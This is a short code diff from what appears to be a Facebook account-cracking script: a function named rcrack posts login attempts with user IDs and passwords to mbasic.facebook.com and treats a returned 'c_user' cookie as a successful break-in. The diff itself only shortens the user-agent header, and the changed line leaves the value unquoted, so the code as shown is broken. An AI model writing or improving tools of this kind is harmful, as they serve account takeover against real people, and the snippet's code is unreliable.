@@ -242,7 +242,7 @@ def rcrack(uid,pwx,tl):
             'sec-fetch-site': 'cross-site',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': Mozilla/5.0 (Windows NT 10.0; Win64; x64)}
+            'user-agent': Mozilla/5.0}
             lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
